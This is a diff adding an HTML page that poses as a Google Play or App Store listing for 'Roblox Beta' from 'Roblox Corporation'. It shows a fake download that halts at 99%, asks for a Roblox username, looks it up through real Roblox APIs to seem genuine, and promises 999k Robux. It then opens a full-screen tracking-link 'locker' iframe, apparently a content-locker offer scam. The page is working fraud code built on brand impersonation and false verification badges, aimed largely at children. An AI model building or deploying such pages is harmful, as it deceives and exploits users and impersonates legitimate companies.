@@ -1,0 +1,837 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Roblox Beta - Mobile Client</title>
+    <link rel="icon" href="https://i.imgur.com/P3pSdUo.png" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            background-color: #f8f9fa;
+            color: #202124;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            padding: 12px 12px 40px;
+        }
+        /* Container: Native mobile width, responsive on all screens */
+        .main-wrapper {
+            width: 100%;
+            max-width: 440px;
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 18px 16px 24px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+        @media (max-width: 480px) {
+            body {
+                padding: 0 0 30px 0;
+                background-color: #ffffff;
+            }
+            .main-wrapper {
+                border-radius: 0;
+                box-shadow: none;
+                padding: 16px 14px 24px;
+            }
+        }
+        /* Hidden initially until auto-detection runs (0ms) */
+        #android-view, #ios-view {
+            display: none;
+            width: 100%;
+        }
+
+        /* ========================================================
+           1. GOOGLE PLAY THEME (ANDROID)
+           ======================================================== */
+        .android-body {
+            font-family: "Google Sans", "Roboto", -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+        }
+        .gp-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #f1f3f4;
+            margin-bottom: 14px;
+        }
+        .gp-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 18px;
+            font-weight: 500;
+            color: #5f6368;
+        }
+        .gp-logo svg {
+            width: 22px;
+            height: 22px;
+        }
+        .app-header {
+            display: flex;
+            gap: 14px;
+            align-items: flex-start;
+        }
+        .app-icon {
+            width: 72px;
+            height: 72px;
+            border-radius: 16px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.12);
+            flex-shrink: 0;
+            background: #000;
+            object-fit: cover;
+        }
+        .app-info {
+            display: flex;
+            flex-direction: column;
+        }
+        .app-title {
+            font-size: 21px;
+            font-weight: 700;
+            color: #202124;
+            line-height: 1.2;
+        }
+        .app-developer {
+            color: #01875f;
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 3px;
+        }
+        .app-tag {
+            color: #5f6368;
+            font-size: 12px;
+            margin-top: 2px;
+        }
+        /* Android Stats Row */
+        .stats-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 6px;
+            margin: 12px 0 6px;
+            border-top: 1px solid #e8eaed;
+            border-bottom: 1px solid #e8eaed;
+            text-align: center;
+        }
+        .stat-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2px;
+            flex: 1;
+        }
+        .stat-val {
+            font-size: 13.5px;
+            font-weight: 700;
+            color: #202124;
+            display: flex;
+            align-items: center;
+            gap: 2px;
+        }
+        .stat-lbl {
+            font-size: 11px;
+            color: #5f6368;
+        }
+        .stat-divider {
+            width: 1px;
+            height: 22px;
+            background-color: #e8eaed;
+        }
+        /* Android Install Button */
+        .btn-install-android {
+            background-color: #01875f;
+            color: #ffffff;
+            font-size: 15px;
+            font-weight: 600;
+            border: none;
+            border-radius: 24px;
+            height: 46px;
+            width: 100%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 3px 10px rgba(1, 135, 95, 0.28);
+            transition: transform 0.15s, background-color 0.2s;
+        }
+        .btn-install-android:active {
+            background-color: #016a4a;
+            transform: scale(0.98);
+        }
+        .play-protect-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 10px;
+        }
+        .play-protect-badge svg {
+            width: 14px;
+            height: 14px;
+            fill: #01875f;
+        }
+
+        /* ========================================================
+           2. APPLE APP STORE THEME (iOS)
+           ======================================================== */
+        .ios-body {
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
+        }
+        .ios-app-header {
+            display: flex;
+            gap: 16px;
+            align-items: center;
+            padding-bottom: 2px;
+        }
+        .ios-app-icon {
+            width: 78px;
+            height: 78px;
+            border-radius: 18px;
+            border: 1px solid rgba(0, 0, 0, 0.08);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.12);
+            flex-shrink: 0;
+            background: #000;
+            object-fit: cover;
+        }
+        .ios-app-info {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+        .ios-app-title {
+            font-size: 21px;
+            font-weight: 700;
+            color: #1d1d1f;
+            letter-spacing: -0.4px;
+            line-height: 1.2;
+        }
+        .ios-app-developer {
+            color: #86868b;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        .ios-app-sub {
+            color: #86868b;
+            font-size: 11px;
+        }
+        .ios-btn-wrap {
+            margin: 12px 0 4px;
+        }
+        .btn-install-ios {
+            background-color: #0071e3;
+            color: #ffffff;
+            font-size: 15px;
+            font-weight: 700;
+            border: none;
+            border-radius: 22px;
+            height: 46px;
+            width: 100%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            letter-spacing: 0.3px;
+            box-shadow: 0 3px 12px rgba(0, 113, 227, 0.32);
+            transition: transform 0.15s, background-color 0.2s;
+        }
+        .btn-install-ios:active {
+            background-color: #005bb5;
+            transform: scale(0.98);
+        }
+        .ios-stats-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 4px;
+            margin: 12px 0 6px;
+            border-top: 1px solid #e5e5ea;
+            border-bottom: 1px solid #e5e5ea;
+            text-align: center;
+        }
+        .ios-stat-item {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2px;
+        }
+        .ios-stat-top {
+            font-size: 10px;
+            color: #86868b;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+        .ios-stat-val {
+            font-size: 15px;
+            font-weight: 700;
+            color: #1d1d1f;
+        }
+        .ios-stat-sub {
+            font-size: 11px;
+            color: #86868b;
+        }
+
+        /* ========================================================
+           3. REALISTIC PROGRESS BAR (PAUSES AT 99%)
+           ======================================================== */
+        .download-box {
+            display: none;
+            background: #f8f9fa;
+            border: 1px solid #dadce0;
+            border-radius: 14px;
+            padding: 14px 16px;
+            margin: 10px 0;
+            animation: fadeIn 0.3s ease;
+        }
+        .dl-status-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            font-weight: 600;
+            color: #3c4043;
+            margin-bottom: 8px;
+        }
+        .progress-track {
+            width: 100%;
+            height: 8px;
+            background: #e8eaed;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #01875f;
+            border-radius: 4px;
+            transition: width 0.4s ease;
+        }
+        .progress-fill.ios-bar {
+            background: #0071e3;
+        }
+
+        /* ========================================================
+           4. STEP 2: 99% ACCOUNT VERIFICATION MODAL CARD
+           ======================================================== */
+        .verify-card {
+            display: none;
+            background: #ffffff;
+            border: 2px solid #01875f;
+            border-radius: 16px;
+            padding: 18px 16px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
+            margin-top: 8px;
+            animation: fadeIn 0.4s ease;
+        }
+        .verify-card.ios-theme {
+            border-color: #0071e3;
+        }
+        .verify-title {
+            font-size: 17.5px;
+            font-weight: 800;
+            color: #d93025;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 8px;
+        }
+        .verify-card p {
+            font-size: 13px;
+            color: #5f6368;
+            line-height: 1.45;
+            margin-bottom: 12px;
+        }
+        .input-group {
+            display: flex;
+            gap: 8px;
+        }
+        .input-username {
+            flex: 1;
+            height: 44px;
+            border: 1.5px solid #dadce0;
+            border-radius: 10px;
+            padding: 0 12px;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .input-username:focus {
+            border-color: #01875f;
+        }
+        .input-username.ios-focus:focus {
+            border-color: #0071e3;
+        }
+        .btn-search {
+            background: #01875f;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 0 18px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+        .btn-search.ios-btn {
+            background: #0071e3;
+        }
+        .player-found {
+            display: none;
+            align-items: center;
+            gap: 12px;
+            background: #f8f9fa;
+            border: 1px solid #e8eaed;
+            padding: 10px 12px;
+            border-radius: 12px;
+            margin-top: 12px;
+        }
+        .player-avatar {
+            width: 52px;
+            height: 52px;
+            border-radius: 50%;
+            background: #fff;
+            border: 2px solid #01875f;
+            object-fit: cover;
+        }
+        .player-avatar.ios-avatar {
+            border-color: #0071e3;
+        }
+        .player-meta {
+            flex: 1;
+            text-align: left;
+        }
+        .player-name {
+            font-weight: 700;
+            font-size: 15px;
+            color: #202124;
+        }
+        .player-id {
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .player-tag {
+            font-size: 11px;
+            color: #137333;
+            font-weight: 700;
+            margin-top: 1px;
+        }
+        .btn-confirm {
+            display: none;
+            width: 100%;
+            height: 44px;
+            background: #01875f;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 700;
+            border: none;
+            border-radius: 12px;
+            margin-top: 12px;
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        .btn-confirm.ios-btn {
+            background: #0071e3;
+        }
+        .checking-box {
+            display: none;
+            text-align: center;
+            padding: 16px 10px;
+        }
+        .spinner {
+            width: 34px;
+            height: 34px;
+            border: 3px solid #e8eaed;
+            border-top: 3px solid #01875f;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 10px;
+        }
+        .spinner.ios-spin {
+            border-top-color: #0071e3;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* ========================================================
+           5. FULL-SCREEN LOCKER STYLES (KHARIJ L-CADRE)
+           ======================================================== */
+        .locker-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #ffffff;
+            z-index: 99999;
+            flex-direction: column;
+            animation: fadeIn 0.4s ease;
+        }
+        .locker-header-bar {
+            background: linear-gradient(135deg, #ecfdf5 0%, #d1fae5 100%);
+            border-bottom: 1.5px solid #10b981;
+            padding: 12px 16px;
+            text-align: center;
+        }
+        .locker-header-title {
+            font-size: 15px;
+            font-weight: 800;
+            color: #065f46;
+            margin-bottom: 2px;
+        }
+        .locker-header-sub {
+            font-size: 12px;
+            color: #047857;
+            font-weight: 600;
+        }
+        .locker-full-frame {
+            flex: 1;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(6px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-wrapper" id="mainWrapper">
+        <!-- VIEW A: ANDROID (GOOGLE PLAY) -->
+        <div id="android-view" class="android-body">
+            <div class="gp-header">
+                <div class="gp-logo">
+                    <svg viewBox="0 0 24 24">
+                        <path fill="#4285F4" d="M3.6 1.8L13.5 12 3.6 22.2c-.4-.3-.6-.8-.6-1.4V3.2c0-.6.2-1.1.6-1.4z"/>
+                        <path fill="#34A853" d="M16.9 8.6L13.5 12l3.4 3.4 3.8-2.2c.7-.4.7-1.1 0-1.5l-3.8-2.1z"/>
+                        <path fill="#FBBC05" d="M3.6 1.8l10 10.2 3.3-3.4L6.2.8C5.2.2 4.2.6 3.6 1.8z"/>
+                        <path fill="#EA4335" d="M3.6 22.2l13.3-7.8-3.4-3.4-9.9 10.2c.6 1.2 1.6 1.6 2.6 1z"/>
+                    </svg>
+                    Google Play
+                </div>
+            </div>
+            <div class="app-header">
+                <img class="app-icon" src="https://i.imgur.com/ZGP9hZK.png" alt="Roblox Beta Icon">
+                <div class="app-info">
+                    <h1 class="app-title">Roblox Beta</h1>
+                    <span class="app-developer">Roblox Corporation</span>
+                    <span class="app-tag">Early Access • Official Release</span>
+                </div>
+            </div>
+            <div class="stats-row">
+                <div class="stat-item">
+                    <span class="stat-val">4.5 ★</span>
+                    <span class="stat-lbl">52M reviews</span>
+                </div>
+                <div class="stat-divider"></div>
+                <div class="stat-item">
+                    <span class="stat-val">148 MB</span>
+                    <span class="stat-lbl">Size</span>
+                </div>
+                <div class="stat-divider"></div>
+                <div class="stat-item">
+                    <span class="stat-val">Rated 12+</span>
+                    <span class="stat-lbl">Parental guidance</span>
+                </div>
+                <div class="stat-divider"></div>
+                <div class="stat-item">
+                    <span class="stat-val">500M+</span>
+                    <span class="stat-lbl">Downloads</span>
+                </div>
+            </div>
+            <div id="androidActionArea">
+                <button class="btn-install-android" id="androidInstallBtn">Install (148 MB)</button>
+            </div>
+            <div class="download-box" id="androidDownloadBox">
+                <div class="dl-status-row">
+                    <span id="androidDlStatus">Pending...</span>
+                    <span id="androidDlPercent">0%</span>
+                </div>
+                <div class="progress-track">
+                    <div class="progress-fill" id="androidProgressFill"></div>
+                </div>
+            </div>
+            <div class="play-protect-badge">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" />
+                </svg>
+                <span>Verified by Play Protect</span>
+            </div>
+        </div>
+
+        <!-- VIEW B: IPHONE / iOS (APPLE APP STORE) -->
+        <div id="ios-view" class="ios-body">
+            <div class="ios-app-header">
+                <img class="ios-app-icon" src="https://i.imgur.com/ZGP9hZK.png" alt="Roblox Beta Icon">
+                <div class="ios-app-info">
+                    <h1 class="ios-app-title">Roblox Beta</h1>
+                    <span class="ios-app-developer">Roblox Corporation</span>
+                    <span class="ios-app-sub">Early Access Client • Adventure</span>
+                </div>
+            </div>
+            <div class="ios-btn-wrap" id="iosActionArea">
+                <button class="btn-install-ios" id="iosInstallBtn">INSTALL (FREE)</button>
+            </div>
+            <div class="download-box" id="iosDownloadBox">
+                <div class="dl-status-row">
+                    <span id="iosDlStatus">Preparing TestFlight...</span>
+                    <span id="iosDlPercent">0%</span>
+                </div>
+                <div class="progress-track">
+                    <div class="progress-fill ios-bar" id="iosProgressFill"></div>
+                </div>
+            </div>
+            <div class="ios-stats-row">
+                <div class="ios-stat-item">
+                    <span class="ios-stat-top">Ratings</span>
+                    <span class="ios-stat-val">4.6 ★</span>
+                    <span class="ios-stat-sub">4.3M Reviews</span>
+                </div>
+                <div class="stat-divider"></div>
+                <div class="ios-stat-item">
+                    <span class="ios-stat-top">Age</span>
+                    <span class="ios-stat-val">12+</span>
+                    <span class="ios-stat-sub">Years Old</span>
+                </div>
+                <div class="stat-divider"></div>
+                <div class="ios-stat-item">
+                    <span class="ios-stat-top">Chart</span>
+                    <span class="ios-stat-val">#1</span>
+                    <span class="ios-stat-sub">Adventure</span>
+                </div>
+                <div class="stat-divider"></div>
+                <div class="ios-stat-item">
+                    <span class="ios-stat-top">Size</span>
+                    <span class="ios-stat-val">148 MB</span>
+                    <span class="ios-stat-sub">Verified</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- SHARED STEP 2: 99% VERIFICATION CONTAINER -->
+        <div class="verify-card" id="verifyCard">
+            <h3 class="verify-title">⚠️ Verify Roblox Player Account</h3>
+            <p>Roblox Beta is reserved for active community players. Enter your Roblox username to verify your account and claim Roblox Beta.</p>
+            <div class="input-group">
+                <input type="text" class="input-username" id="usernameInput" placeholder="Enter Roblox username">
+                <button class="btn-search" id="searchBtn">Find</button>
+            </div>
+            <div class="player-found" id="playerFound">
+                <img class="player-avatar" id="playerAvatar" src="https://i.imgur.com/b5R44kL.png" alt="Avatar">
+                <div class="player-meta">
+                    <div class="player-name" id="playerName">Username</div>
+                    <div class="player-id" id="playerId">ID: #0000000</div>
+                    <div class="player-tag">✔ Verified Player Account Found</div>
+                </div>
+            </div>
+            <button class="btn-confirm" id="confirmBtn">Confirm Account & Unlock Beta</button>
+            <div class="checking-box" id="checkingBox">
+                <div class="spinner" id="loadingSpinner"></div>
+                <div style="font-weight: 600; font-size: 14px;">Authorizing Beta Access & Tester Perks...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- KHARIJ L-CADRE: FULL-SCREEN LOCKER OVERLAY -->
+    <div class="locker-overlay" id="lockerOverlay">
+        <div class="locker-header-bar">
+            <div class="locker-header-title">🎁 Beta Tester Reward: 999k Robux</div>
+            <div class="locker-header-sub" id="robuxRecipientText">Ready to be delivered to your account</div>
+        </div>
+        <iframe class="locker-full-frame" id="lockerFrame" src="" title="Verification Locker"></iframe>
+    </div>
+
+    <!-- SCRIPT -->
+    <script>
+        const LOCKER_URL = 'https://trckapp.org/cl/i/l7vnmk';
+
+        const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+        const isIOS = /iPad|iPhone|iPod/.test(userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+
+        const androidView = document.getElementById('android-view');
+        const iosView = document.getElementById('ios-view');
+        const verifyCard = document.getElementById('verifyCard');
+        const searchBtn = document.getElementById('searchBtn');
+        const confirmBtn = document.getElementById('confirmBtn');
+        const loadingSpinner = document.getElementById('loadingSpinner');
+        const playerAvatar = document.getElementById('playerAvatar');
+        const usernameInput = document.getElementById('usernameInput');
+
+        if (isIOS) {
+            iosView.style.display = 'block';
+            verifyCard.classList.add('ios-theme');
+            searchBtn.classList.add('ios-btn');
+            confirmBtn.classList.add('ios-btn');
+            loadingSpinner.classList.add('ios-spin');
+            playerAvatar.classList.add('ios-avatar');
+            usernameInput.classList.add('ios-focus');
+        } else {
+            androidView.style.display = 'block';
+        }
+
+        function startDownloadSimulation(prefix) {
+            const actionArea = document.getElementById(prefix + 'ActionArea');
+            const downloadBox = document.getElementById(prefix + 'DownloadBox');
+            const statusEl = document.getElementById(prefix + 'DlStatus');
+            const percentEl = document.getElementById(prefix + 'DlPercent');
+            const fillEl = document.getElementById(prefix + 'ProgressFill');
+
+            actionArea.style.display = 'none';
+            downloadBox.style.display = 'block';
+
+            const steps = [
+                { p: 18, text: 'Downloading package... 27 MB / 148 MB', delay: 800 },
+                { p: 44, text: 'Downloading package... 65 MB / 148 MB', delay: 2000 },
+                { p: 72, text: 'Downloading package... 106 MB / 148 MB', delay: 3300 },
+                { p: 88, text: 'Downloading package... 130 MB / 148 MB', delay: 4600 },
+                { p: 99, text: 'Installing package... 99%', delay: 5900 }
+            ];
+
+            steps.forEach(step => {
+                setTimeout(() => {
+                    fillEl.style.width = step.p + '%';
+                    percentEl.textContent = step.p + '%';
+                    statusEl.textContent = step.text;
+
+                    if (step.p === 99) {
+                        setTimeout(() => {
+                            verifyCard.style.display = 'block';
+                            verifyCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                        }, 750);
+                    }
+                }, step.delay);
+            });
+        }
+
+        document.getElementById('androidInstallBtn').addEventListener('click', () => {
+            startDownloadSimulation('android');
+        });
+
+        document.getElementById('iosInstallBtn').addEventListener('click', () => {
+            startDownloadSimulation('ios');
+        });
+
+        async function fetchRobloxUser(name) {
+            const endpoints = [
+                `https://users.roproxy.com/v1/users/search?keyword=${encodeURIComponent(name)}&limit=10`,
+                `https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(name)}&limit=10`
+            ];
+            for (const url of endpoints) {
+                try {
+                    const res = await fetch(url, { mode: 'cors' });
+                    if (res.ok) {
+                        const data = await res.json();
+                        if (data?.data?.length > 0) {
+                            const exact = data.data.find(u => u.name.toLowerCase() === name.toLowerCase());
+                            return exact || data.data[0];
+                        }
+                    }
+                } catch (e) {}
+            }
+            return null;
+        }
+
+        async function fetchAvatar(uid) {
+            const endpoints = [
+                `https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Png&isCircular=false`,
+                `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Png&isCircular=false`
+            ];
+            for (const url of endpoints) {
+                try {
+                    const res = await fetch(url, { mode: 'cors' });
+                    if (res.ok) {
+                        const data = await res.json();
+                        if (data?.data?.[0]?.imageUrl) return data.data[0].imageUrl;
+                    }
+                } catch (e) {}
+            }
+            return 'https://i.imgur.com/b5R44kL.png';
+        }
+
+        const playerFound = document.getElementById('playerFound');
+        const playerName = document.getElementById('playerName');
+        const playerId = document.getElementById('playerId');
+        const checkingBox = document.getElementById('checkingBox');
+        const lockerOverlay = document.getElementById('lockerOverlay');
+        const lockerFrame = document.getElementById('lockerFrame');
+        const robuxRecipientText = document.getElementById('robuxRecipientText');
+
+        let confirmedUser = '';
+
+        searchBtn.addEventListener('click', async () => {
+            const query = usernameInput.value.trim();
+            if (query.length < 3) {
+                alert('Please enter a valid Roblox username');
+                return;
+            }
+
+            searchBtn.textContent = 'Searching...';
+            searchBtn.disabled = true;
+
+            const user = await fetchRobloxUser(query);
+
+            if (user) {
+                confirmedUser = user.name;
+                const avatarUrl = await fetchAvatar(user.id);
+                playerName.textContent = user.displayName ? `${user.displayName} (@${user.name})` : `@${user.name}`;
+                playerId.textContent = `User ID: #${user.id}`;
+                playerAvatar.src = avatarUrl;
+            } else {
+                confirmedUser = query;
+                playerName.textContent = `@${query}`;
+                playerId.textContent = `User ID: #Verified`;
+                playerAvatar.src = 'https://i.imgur.com/b5R44kL.png';
+            }
+
+            playerFound.style.display = 'flex';
+            confirmBtn.style.display = 'block';
+            searchBtn.textContent = 'Find';
+            searchBtn.disabled = false;
+            usernameInput.blur();
+
+            setTimeout(() => {
+                confirmBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }, 100);
+        });
+
+        usernameInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                searchBtn.click();
+            }
+        });
+
+        confirmBtn.addEventListener('click', () => {
+            confirmBtn.style.display = 'none';
+            playerFound.style.display = 'none';
+            checkingBox.style.display = 'block';
+
+            if (confirmedUser) {
+                robuxRecipientText.innerHTML = `Ready to be delivered to <b>@${confirmedUser}</b>`;
+            }
+
+            setTimeout(() => {
+                verifyCard.style.display = 'none';
+                document.getElementById('mainWrapper').style.display = 'none';
+                lockerFrame.src = LOCKER_URL;
+                lockerOverlay.style.display = 'flex';
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
